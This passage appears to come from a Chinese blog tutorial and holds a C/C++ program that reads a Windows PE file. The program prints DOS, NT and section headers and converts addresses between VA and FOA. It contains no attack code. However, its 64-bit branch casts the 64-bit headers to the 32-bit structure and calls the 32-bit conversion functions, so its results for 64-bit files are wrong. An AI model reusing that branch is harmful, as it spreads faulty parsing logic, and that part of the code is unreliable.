class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PE.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//在VC6这个比较旧的环境里，没有定义64位的这个宏，需要自己定义，在VS2019中无需自己定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_MACHINE_AMD64  0x8664</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa32</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize, (UINT)sectionArr[i]-&gt;SizeOfRawData) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment) * nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//VA转FOA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在内存中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">VaToFoa64</span><span class="params">(UINT va, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//得到RVA的值：RVA = VA - ImageBase</span></span><br><span class="line">    UINT rva = va - nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    <span class="comment">//输出rva</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rva:%X\n&quot;</span>, rva);</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//输出PeEnd</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PeEnd:%X\n&quot;</span>, PeEnd);</span><br><span class="line">    <span class="comment">//判断rva是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (rva &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva位于PE文件头中，则foa==rva，直接返回rva即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, rva);</span><br><span class="line">        <span class="keyword">return</span> rva;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果rva在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断rva属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算内存对齐后节的大小</span></span><br><span class="line">            UINT SizeInMemory = <span class="built_in">ceil</span>((<span class="keyword">double</span>)<span class="built_in">max</span>((UINT)sectionArr[i]-&gt;Misc.VirtualSize, (UINT)sectionArr[i]-&gt;SizeOfRawData) / (<span class="keyword">double</span>)nt-&gt;OptionalHeader.SectionAlignment) * nt-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">            <span class="keyword">if</span> (rva &gt;= sectionArr[i]-&gt;VirtualAddress &amp;&amp; rva &lt; (sectionArr[i]-&gt;VirtualAddress + SizeInMemory))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节</span></span><br><span class="line">                <span class="comment">//输出内存对齐后的节的大小</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeInMemory:%X\n&quot;</span>, SizeInMemory);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= RVA - 节.VirtualAddress</span></span><br><span class="line">            UINT offset = rva - sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="comment">//FOA = 节.PointerToRawData + 差值</span></span><br><span class="line">            UINT foa = sectionArr[i]-&gt;PointerToRawData + offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;foa:%X\n&quot;</span>, foa);</span><br><span class="line">            <span class="keyword">return</span> foa;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA转VA 32位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在文件中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">FoaToVa32</span><span class="params">(UINT foa, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS);</span><br><span class="line">    <span class="comment">//判断FOA是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (foa &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa位于PE文件头中，则foa==rva，直接返回foa+ImageBase即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, foa + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">        <span class="keyword">return</span> foa + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断foa属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (foa &gt;= sectionArr[i]-&gt;PointerToRawData &amp;&amp; foa &lt; (sectionArr[i]-&gt;PointerToRawData + sectionArr[i]-&gt;SizeOfRawData))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节                </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= FOA - 节.PointerToRawData </span></span><br><span class="line">            UINT offset = foa - sectionArr[i]-&gt;PointerToRawData;</span><br><span class="line">            <span class="comment">//RVA = 差值 + 节.VirtualAddress(RVA)</span></span><br><span class="line">            UINT rva = offset + sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, rva + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">            <span class="keyword">return</span> rva + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA转VA 64位</span></span><br><span class="line"><span class="comment">//第一个参数为要转换的在文件中的地址：VA</span></span><br><span class="line"><span class="comment">//第二个参数为指向dos头的指针</span></span><br><span class="line"><span class="comment">//第三个参数为指向nt头的指针</span></span><br><span class="line"><span class="comment">//第四个参数为存储指向节指针的数组</span></span><br><span class="line"><span class="function">UINT <span class="title">FoaToVa64</span><span class="params">(UINT foa, _IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS64* nt, _IMAGE_SECTION_HEADER** sectionArr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//找到PE文件头后的地址 = PE文件头首地址+PE文件头大小</span></span><br><span class="line">    UINT PeEnd = (UINT)dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64);</span><br><span class="line">    <span class="comment">//判断FOA是否位于PE文件头中</span></span><br><span class="line">    <span class="keyword">if</span> (foa &lt; PeEnd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa位于PE文件头中，则foa==rva，直接返回foa+ImageBase即可</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, foa + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">        <span class="keyword">return</span> foa + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果foa在PE文件头外</span></span><br><span class="line">        <span class="comment">//判断foa属于哪个节</span></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (foa &gt;= sectionArr[i]-&gt;PointerToRawData &amp;&amp; foa &lt; (sectionArr[i]-&gt;PointerToRawData + sectionArr[i]-&gt;SizeOfRawData))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//找到所属的节                </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//未找到</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有找到匹配的节\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//计算差值= FOA - 节.PointerToRawData </span></span><br><span class="line">            UINT offset = foa - sectionArr[i]-&gt;PointerToRawData;</span><br><span class="line">            <span class="comment">//RVA = 差值 + 节.VirtualAddress(RVA)</span></span><br><span class="line">            UINT rva = offset + sectionArr[i]-&gt;VirtualAddress;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;va:%X\n&quot;</span>, rva + nt-&gt;OptionalHeader.ImageBase);</span><br><span class="line">            <span class="keyword">return</span> rva + nt-&gt;OptionalHeader.ImageBase;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">//创建DOS对应的结构体指针</span></span><br><span class="line">    _IMAGE_DOS_HEADER* dos;</span><br><span class="line">    <span class="comment">//读取文件，返回文件句柄</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;C:\\Users\\86156\\Desktop\\N1.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//根据文件句柄创建映射</span></span><br><span class="line">    HANDLE hMap = <span class="built_in">CreateFileMappingA</span>(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//映射内容</span></span><br><span class="line">    LPVOID pFile = <span class="built_in">MapViewOfFile</span>(hMap, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//类型转换，用结构体的方式来读取</span></span><br><span class="line">    dos = (_IMAGE_DOS_HEADER*)pFile;</span><br><span class="line">    <span class="comment">//输出dos-&gt;e_magic，以十六进制输出</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dos-&gt;e_magic:%X\n&quot;</span>, dos-&gt;e_magic);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向PE文件头标志的指针</span></span><br><span class="line">    DWORD* peId;</span><br><span class="line">    <span class="comment">//让PE文件头标志指针指向其对应的地址=DOS首地址+偏移</span></span><br><span class="line">    peId = (DWORD*)((UINT)dos + dos-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">//输出PE文件头标志，其值应为4550，否则不是PE文件</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;peId:%X\n&quot;</span>, *peId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建指向可选PE头的第一个成员magic的指针</span></span><br><span class="line">    WORD* magic;</span><br><span class="line">    <span class="comment">//让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小</span></span><br><span class="line">    magic = (WORD*)((UINT)peId + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_FILE_HEADER));</span><br><span class="line">    <span class="comment">//输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic:%X\n&quot;</span>, *magic);</span><br><span class="line">    <span class="comment">//根据magic判断为32位程序还是64位程序</span></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (*magic)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;32位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS* nt;</span><br><span class="line">        <span class="comment">//让PE文件头指针指向其对应的地址</span></span><br><span class="line">        nt = (_IMAGE_NT_HEADERS*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>, dos, nt, sectionArr);</span><br><span class="line">        <span class="built_in">FoaToVa32</span>(<span class="number">0x176B0</span>, dos, nt, sectionArr);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;64位程序\n&quot;</span>);</span><br><span class="line">        <span class="comment">//确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了</span></span><br><span class="line">        <span class="comment">//创建指向PE文件头的指针</span></span><br><span class="line">        _IMAGE_NT_HEADERS64* nt;</span><br><span class="line">        nt = (_IMAGE_NT_HEADERS64*)peId;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Machine:%X\n&quot;</span>, nt-&gt;FileHeader.Machine);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Magic:%X\n&quot;</span>, nt-&gt;OptionalHeader.Magic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建一个指针数组，该指针数组用来存储所有的节表指针</span></span><br><span class="line">        <span class="comment">//这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt-&gt;FileHeader.NumberOfSections],声明了一个动态数组</span></span><br><span class="line">        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER*) * nt-&gt;FileHeader.NumberOfSections);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建指向块表的指针</span></span><br><span class="line">        _IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">        <span class="comment">//让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64</span></span><br><span class="line">        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_NT_HEADERS64));</span><br><span class="line">        <span class="comment">//计数，用来计算块表地址</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//比较 计数 和 块表的个数，即遍历所有块表</span></span><br><span class="line">        <span class="keyword">while</span> (cnt &lt; nt-&gt;FileHeader.NumberOfSections)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//创建指向块表的指针</span></span><br><span class="line">            _IMAGE_SECTION_HEADER* section;</span><br><span class="line">            <span class="comment">//让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小</span></span><br><span class="line">            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(_IMAGE_SECTION_HEADER) * cnt);</span><br><span class="line">            <span class="comment">//将得到的块表指针存入数组</span></span><br><span class="line">            sectionArr[cnt++] = section;</span><br><span class="line">            <span class="comment">//输出块表名称</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, section-&gt;Name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">VaToFoa32</span>(<span class="number">0x4198B0</span>, dos, (_IMAGE_NT_HEADERS *)nt, sectionArr);</span><br><span class="line">        <span class="built_in">FoaToVa32</span>(<span class="number">0x176B0</span>, dos, (_IMAGE_NT_HEADERS * )nt, sectionArr);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据代码，我们可以.data区块的RVA值</p>
